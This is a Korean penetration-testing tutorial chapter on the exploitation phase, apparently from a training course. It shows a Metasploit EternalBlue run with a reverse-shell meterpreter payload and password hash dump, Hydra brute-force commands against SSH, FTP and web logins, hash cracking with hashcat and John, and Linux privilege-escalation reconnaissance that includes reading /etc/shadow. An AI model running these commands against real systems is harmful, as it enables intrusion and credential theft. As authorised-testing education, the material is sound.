익스플로잇

식별된 취약점을 실제로 악용하여 시스템에 접근하는 익스플로잇(Exploitation) 단계를 다룹니다. 다양한 공격 기법과 도구, 그리고 안전한 테스트 방법을 학습합니다.

⚠️ 중요 경고

이 장에서 다루는 기법들은 오직 교육 목적과 허가된 침투 테스트에서만 사용해야 합니다. 무단으로 시스템을 공격하는 것은 불법이며 심각한 법적 처벌을 받을 수 있습니다. 항상 서면 허가를 받고, 범위 내에서만 테스트를 수행하세요.

4.1 익스플로잇 개요

익스플로잇은 취약점 분석 단계에서 발견된 보안 약점을 실제로 악용하여 시스템에 무단 접근하거나 권한을 획득하는 과정입니다. 이 단계의 목표는 취약점이 실제 환경에서 악용 가능한지, 그리고 그 영향이 얼마나 심각한지를 검증하는 것입니다.

4.1.1 익스플로잇 단계

  1. 대상 선정: 악용할 취약점과 대상 시스템 결정
  2. 페이로드 준비: 익스플로잇 코드 및 페이로드 구성
  3. 실행: 취약점을 악용하여 초기 접근 획득
  4. 검증: 접근 수준 및 영향 확인
  5. 문서화: 성공/실패 결과 기록

4.2 Metasploit Framework

Metasploit은 가장 널리 사용되는 침투 테스트 프레임워크로, 익스플로잇 개발, 페이로드 생성, 후속 익스플로잇 작업을 위한 종합 도구입니다.

4.2.1 Metasploit 기본 사용법

# Metasploit 콘솔 시작
msfconsole

# 익스플로잇 검색
msf6 > search type:exploit platform:windows smb
msf6 > search cve:2021

# 익스플로잇 선택 및 정보 확인
msf6 > use exploit/windows/smb/ms17_010_eternalblue
msf6 exploit(ms17_010_eternalblue) > info
msf6 exploit(ms17_010_eternalblue) > show options

# 옵션 설정
msf6 exploit(ms17_010_eternalblue) > set RHOSTS 192.168.1.100
msf6 exploit(ms17_010_eternalblue) > set LHOST 192.168.1.10

# 페이로드 선택
msf6 exploit(ms17_010_eternalblue) > show payloads
msf6 exploit(ms17_010_eternalblue) > set PAYLOAD windows/x64/meterpreter/reverse_tcp

# 익스플로잇 실행
msf6 exploit(ms17_010_eternalblue) > exploit

meterpreter > hashdump          # 패스워드 해시 덤프

4.4 네트워크 익스플로잇

4.4.1 패스워드 공격

공격 유형 설명 도구
브루트포스 모든 조합 시도 Hydra, Medusa
사전 공격 단어 목록 기반 Hydra, Burp Intruder
패스워드 스프레이 다수 계정에 소수 패스워드 Spray, CrackMapExec
해시 크래킹 해시에서 평문 복구 Hashcat, John 
# Hydra 브루트포스
hydra -l admin -P passwords.txt ssh://192.168.1.100
hydra -L users.txt -P passwords.txt ftp://192.168.1.100
hydra -l admin -P passwords.txt 192.168.1.100 http-post-form "/login:user=^USER^&pass=^PASS^:Invalid"

# 해시 크래킹
hashcat -m 0 hash.txt wordlist.txt           # MD5
hashcat -m 1000 hash.txt wordlist.txt        # NTLM
hashcat -m 1800 hash.txt wordlist.txt        # SHA-512 (Linux)

# John the Ripper
john --wordlist=wordlist.txt hashes.txt
john --show hashes.txt

4.5 권한 상승

4.5.1 Linux 권한 상승

# 시스템 정보 수집
uname -a
cat /etc/os-release
cat /etc/passwd
cat /etc/shadow  # root 필요

# SUID 바이너리 찾기
find / -perm -4000 -type f 2>/dev/null
find / -perm -u=s -type f 2>/dev/null

# 쓰기 가능한 파일/디렉토리
find / -writable -type d 2>/dev/null
find / -writable -type f 2>/dev/null

# sudo 권한 확인
sudo -l

# Cron 작업 확인
cat /etc/crontab
ls -la /etc/cron.d/

# 커널 익스플로잇 검색
searchsploit linux kernel 5.4

4.5.2 Windows 권한 상승

# 시스템 정보
systeminfo

# 서비스 취약점
sc query state=all

4.6 안전한 익스플로잇 원칙

🛡️ 안전한 테스트 원칙

  • 최소 영향: 시스템 가용성에 영향을 주지 않는 방법 우선
  • 문서화: 모든 활동을 상세히 기록
  • 복원 계획: 변경사항 롤백 방법 준비
  • 범위 준수: 허가된 범위 내에서만 테스트
  • 데이터 보호: 접근한 민감 데이터 적절히 처리
  • 즉시 보고: 심각한 취약점 발견 시 즉시 보고
